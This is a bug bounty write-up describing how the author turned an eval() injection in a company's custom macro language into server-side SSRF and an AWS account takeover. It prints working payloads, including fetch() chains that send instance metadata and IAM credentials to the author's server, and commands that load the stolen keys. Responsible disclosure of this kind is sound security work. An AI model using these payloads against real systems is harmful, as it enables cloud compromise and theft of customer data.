---
date: 2018-10-02
title: AWS takeover through SSRF in JavaScript
images: [/images/aws-webservices.png]
tags:
- bug bounty
- aws
- ssrf
- javascript
see_also:
  -
    link: React
    url: https://reactjs.org/
  -
    link: Introduction to fetch()
    url: https://developers.google.com/web/updates/2015/03/introduction-to-fetch
  -
    link: PayloadsAllTheThings
    url: https://github.com/swisskyrepo/PayloadsAllTheThings
  -
    link: AWS Documentation
    url: https://docs.aws.amazon.com/
---
Here is the story of a bug I found in a private bug bounty program on [Hackerone](https://hackerone.com/).
It took me exactly 12h30 -no break- to find it, exploit and report.
I was able to dump the AWS credentials, this lead me to fully compromise the account of the company: 20 buckets and 80 EC2 instances (Amazon Elastic Compute Cloud) in my hands.
Besides the fact that it's one of my best bug in my hunter career, I also learnt alot during this sprint, so let's share!
<!--more-->


## Intro

As I said, the program is private so the company, let's call it: ArticMonkey.  
For the purpose of their activity -and their web application- ArticMonkey has developed a custom macro language, let's call it: Banan++.
I don't know what language was initially used for the creation of Banan++ but from the webapp you can get a JavaScript version, let's dig in!

The original `banan++.js` file was minified, but still huge, 2.1M compressed, 2.5M beautified, 56441 lines and 2546981 characters, enjoy.
No need to say that I didn't read the whole sh...
By searching some keywords very specific to Banan++, I located the first function at line 3348.
About 135 functions were available at that time.
This was my playground.


## Spot the issue

I started to read the code by the top but most of the functions were about date manipulation or mathematical operations, nothing really insteresting or dangerous.
After a while, I finally found one called `Union()` that looked promising, below the code:
```js
helper.prototype.Union = function() {
   for (var _len22 = arguments.length, args = Array(_len22), _key22 = 0; _key22 < _len22; _key22++) args[_key22] = arguments[_key22];
   var value = args.shift(),
    symbol = args.shift(),
    results = args.filter(function(arg) {
     try {
      return eval(value + symbol + arg)
     } catch (e) {
      return !1
     }
    });
   return !!results.length
  }
```

Did you notice that? Did you notice that kinky ```eval()```? Looks sooooooooooo interesting!
I copied the code on a local HTML file in order to perform more tests.

Basically the function can take from 0 to infinite arguments but start to be useful at 3.
The `eval()` is used to compare the first argument to the third one with the help of the second, then the fourth is tested, the fifth etc...
Normal usage should be something like `Union(1,'<',3);` and the returned value `true` if at least one of these tests is true or `false`.  
However there is absolutely no sanitization performed or test regarding the type and the value of the arguments.
With the help of my favourite debugger `alert()` I understood that an exploit could be triggered in many different ways:

```js
Union( 'alert()//', '2', '3' );
Union( '1', '2;alert();', '3' );
Union( '1', '2', '3;alert()' );
...
```


## Find an injection point

Ok so I had a vulnerable function, which is always good, but what I needed was an input to inject some malicious code.
I remembered that I already seen some POST parameters using Banan++ functions so I performed a quick search in my Burp Suite history.
Got it:
```http
POST /REDACTED HTTP/1.1
Host: api.REDACTED.com
Connection: close
Content-Length: 232
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3502.0 Safari/537.36 autochrome/red
Content-Type: application/json;charset=UTF-8
Referer: https://app.REDACTED.com/REDACTED
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: auth=REDACTED

{...REDACTED...,"operation":"( Year( CurrentDate() ) > 2017 )"}
```
Response:
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 54
Connection: close
X-Content-Type-Options: nosniff
X-Xss-Protection: 1
Strict-Transport-Security: max-age=15768000; includeSubDomains
...REDACTED...

[{"name":"REDACTED",...REDACTED...}]
```

The parameter `operation` seems to be a good option. Time for testing!


## Perform the injection

Since I didn't know anything about Banan++, I had to perform some tests in order to find out what kind of code I could inject or not.
Sort of manual fuzzing.

```json
{...REDACTED...,"operation":"'\"><"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":null}
[]
```
```json
{...REDACTED...,"operation":"0"}
[]
```
```json
{...REDACTED...,"operation":"1"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"a"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"a=1"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"alert"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"alert()"}
{"status":400,"message":"Function 'alert' is not defined"}
```
```json
{...REDACTED...,"operation":"Union()"}
[]
```

What I conclued here was:
- I cannot inject whatever JavaScript I want
- I can inject Banan++ functions
- the response seems to act like a true/false flag depending if the interpretation of parameter `operation` is true or false
(which was very useful to validate the code I injected)

Let's continue with `Union()`:
```json
{...REDACTED...,"operation":"Union(1,2,3)"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"Union(a,b,c)"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"Union('a','b','c')"}
{"status":400,"message":"Parse error on line 1...REDACTED..."}
```
```json
{...REDACTED...,"operation":"Union('a';'b';'c')"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"Union('1';'2';'3')"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"Union('1';'<';'3')"}
[{"name":"REDACTED",...REDACTED...}]
```
```json
{...REDACTED...,"operation":"Union('1';'>';'3')"}
[]]
```

Perfect! If `1 < 3` then the response contains valid datas (true), but if `1 > 3` then the response is empty (false).
Parameters must be separated by a semi colon.
I could now try a real attack.


## fetch is the new XMLHttpRequest

Because the request is an ajax call to the api that only returns JSON datas, it's obviously not a client side injection.
I also knew from a previous report that ArticMonkey tends to use alot JavaScript server side.

But it doesn't matter, I had to try everything, maybe I could trigger an error that would reveal informations about the system the JavaScript runs on.
Since my local testing, I knew exactly how to inject my malicious code. I tried basic XSS payloads and malformed JavaScript but all I got was the error previously mentionned.

I then tried to fire an HTTP request.

With an ajax call first:
```js
x = new XMLHttpRequest;
x.open( 'GET','https://poc.myserver.com' );
x.send();
```

But didn't receive anything. I tried HTML injection:
```js
i = document.createElement( 'img' );
i.src = '<img src="https://poc.myserver.com/xxx.png">';
document.body.appendChild( i );
```
But didn't receive anything! More tries:
```js
document.body.innerHTML += '<img src="https://poc.myserver.com/xxx.png">';
```
```js
document.body.innerHTML += '<iframe src="https://poc.myserver.com">';
```

But didn't receive anything!!!

Sometimes you know, you have to test stupid things by yourself to understand how stupid it was...
Obviously it was a mistake to try to render HTML code, but hey! I'm just a hacker...
Back to the ajax request, I stayed stuck there for a while.
It took me quite a long time to figure out how to make it work.

I finally remembered that ArticMonkey uses ReactJS on their frontend, I would later learnt that they use NodeJS server side.
Anyway, I checked on Google how to perform an ajax request with it and found the solution in the [official documentation](https://reactjs.org/docs/faq-ajax.html) which lead me to the [fetch()](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) function which is the new standard to perform ajax calls, that was the key.

I injected the following:
```js
fetch('https://poc.myserver.com')
```

And immediately got a new line in my Apache log.

Being able to ping my server is a thing but it's a blind SSRF, I had no response echoed back.
I had the idea to chain two requests where the second would send the result of the first one.
Something like:

```js
x1 = new XMLHttpRequest;
x1.open( 'GET','https://...', false );
x1.send();
r = x1.responseText;

x2 = new XMLHttpRequest;
x2.open( 'GET','https://poc.myserver.com/?r='+r, false );
x2.send();
```

Again it took me while to get the correct syntax with `fetch()`.
Thanks [StackOverflow](https://stackoverflow.com/a/45529432).

I ended with the following code which works pretty well:
```js
fetch('https://...').then(res=>res.text()).then((r)=>fetch('https://poc.myserver.com/?r='+r));
```

Of course, Origin policy applies.


## SSRF for the win

I firstly tried to read local files:
```js
fetch('file:///etc/issue').then(res=>res.text()).then((r)=>fetch('https://poc.myserver.com/?r='+r));
```

But the response (`r` parameter) in my Apache log file was empty.

Since I found some S3 buckets related to ArticMonkey (`articmonkey-xxx`), I thought that this company might also use AWS servers for their webapp (which was also confirmed by the header in some responses `x-cache: Hit from cloudfront`).
I quickly jumped on the list of the most common [SSRF URL for Cloud Instances](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection).

And got a nice hit when I tried to access the metadatas of the instance.
<a href="/images/ssrf-aws-takeover-burpsuite.png" title="aws takeover through ssrf in javascript" target="_blank"><img src="/images/ssrf-aws-takeover-burpsuite.png" alt="aws takeover through ssrf in javascript" /></a>

Decoded output is the directory listing returned:
```none
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
...
```

Final payload:
```none
{...REDACTED...,"operation":"Union('1';'2;fetch(\"http://169.254.169.254/latest/meta-data/\").then(res=>res.text()).then((r)=>fetch(\"https://poc.myserver.com/?r=\"+r));';'3')"}
```

Since I didn't know anything about AWS metadatas, because it was my first time in da place.
I took time to explore the directories and all files at my disposition. As you will read everywhere, the most insteresting one is `http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>`.
Which returned:
```json
{
  "Code":"Success",
  "Type":"AWS-HMAC",
  "AccessKeyId":"...REDACTED...",
  "SecretAccessKey":"...REDACTED...",
  "Token":"...REDACTED...",
  "Expiration":"2018-09-06T19:24:38Z",
  "LastUpdated":"2018-09-06T19:09:38Z"
}
```


## Exploit the credentials

At that time, I though that the game was ended.
But for my PoC I wanted to show the criticity of this leak, I wanted something really strong!
I tried to use those credentials to impersonate the company.
You have to know that they are temporary credentials, only valid for a short period, 5mn more or less.
Anyway, 5mn is supposed to be more than enough to update my own credentials to those ones, 2 copy/paste, I can handle that...
err...

I asked for help on Twitter from SSRF and AWS master. Thank guys, I truely appreciate your commitment, but I finally found the solution in the [UserGuide of AWS Identity and Access Management](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html). My mistake, except to not read the documentation (...), was to only use `AccessKeyId` and `SecretAccessKey`, this doesn't work, the token must also be exported. Kiddies...
```sh
$ export AWS_ACCESS_KEY_ID=AKIAX7EFFWBWFRW3ACIR...
$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
$ export AWS_SESSION_TOKEN=AQoDYXdzEJr...
```

Checking my idendity with the following command proved that I was not myself anymore.
```sh
aws sts get-caller-identity
```

And then...  
<a href="/images/ssrf-aws-takeover-poc.png" title="aws takeover through ssrf in javascript" target="_blank"><img src="/images/ssrf-aws-takeover-poc.png" alt="aws takeover through ssrf in javascript" /></a>

Left: listing of the EC2 instances configured by ArticMonkey. Probably a big part -or the whole- of their system.

Right: the company owns 20 buckets containing, highly sensitive datas from customers, static files for the web application and, according to the name of the buckets, probably logs/backups of their servers.

Impact: lethal.


## Conclusion

I learnt alot because of this bug:

- ReactJS, fetch(), AWS metadatas.
- RTFM! The official documentation is always a great source of (useful) informations.
- At each step new problems appeared. I had to search everywhere, try many different things, I had to push my limits to not give up.
- I now know that I can fully compromise a system by myself starting from 0, which is a great personal  achievement and statisfaction :)

When someone tells you that you'll never be able to do something, don't waste your time to bargain with these peoples, simply prove them they're wrong by doing it.


## Timeline

06/09/2018 12h00 - beginning of the hunt  
07/09/2018 00h30 - report  
07/09/2018 19h30 - fix and reward  

Thanks to ArticMonkey for being so fast to fix and reward, and agreed this article :)


## External resources

- [React](https://reactjs.org/)
- [Introduction to fetch()](https://developers.google.com/web/updates/2015/03/introduction-to-fetch)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [AWS Documentation](https://docs.aws.amazon.com/)
